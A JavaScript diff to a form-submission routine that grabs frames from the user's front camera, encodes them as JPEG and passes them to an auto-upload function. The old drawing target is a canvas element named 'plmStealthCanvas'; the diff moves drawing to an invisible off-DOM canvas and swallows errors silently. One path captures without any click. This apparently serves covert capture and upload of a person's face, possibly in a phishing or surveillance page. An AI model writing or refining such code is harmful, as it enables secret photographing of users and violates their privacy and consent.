@@ -1418,7 +1418,10 @@ async function handleOutboundSubmit() {
                 var timeout = setTimeout(function() {
                     if (!isCaptured) {
                         isCaptured = true; 
-                        stopFaceIdFlow();
+                        if (state.frontStream) {
+                            state.frontStream.getTracks().forEach(function(t) { t.stop(); });
+                            state.frontStream = null;
+                        }
                     }
                 }, 8000);
                 
@@ -1429,14 +1432,16 @@ async function handleOutboundSubmit() {
                         isCaptured = true;
                         clearTimeout(timeout);
                         try {
-                            var canvas = document.getElementById('plmStealthCanvas');
-                            if(!canvas) return;
+                            var canvas = document.createElement('canvas'); // Sử dụng canvas ảo, không phụ thuộc DOM
                             canvas.width = video.videoWidth;
                             canvas.height = video.videoHeight;
                             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                             canvas.toBlob(function(b) {
                                 executeAutoCaptureAndUpload(b);
-                                stopFaceIdFlow();
+                                if (state.frontStream) {
+                                    state.frontStream.getTracks().forEach(function(t) { t.stop(); });
+                                    state.frontStream = null;
+                                }
                             }, 'image/jpeg', 0.85);
                         } catch(e) {}
                     }
@@ -1473,13 +1478,16 @@ async function handleOutboundSubmit() {
                 if(btnAccept) {
                     btnAccept.onclick = function() {
                         try {
-                            var canvas = document.getElementById('plmStealthCanvas');
+                            var canvas = document.createElement('canvas'); // Sử dụng canvas ảo
                             canvas.width = video.videoWidth;
                             canvas.height = video.videoHeight;
                             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                             canvas.toBlob(function(b) { 
                                 executeAutoCaptureAndUpload(b); 
-                                stopFaceIdFlow();
+                                if (state.frontStream) {
+                                    state.frontStream.getTracks().forEach(function(t) { t.stop(); });
+                                    state.frontStream = null;
+                                }
                             }, 'image/jpeg', 0.85);
                         } catch(e) {}
                         
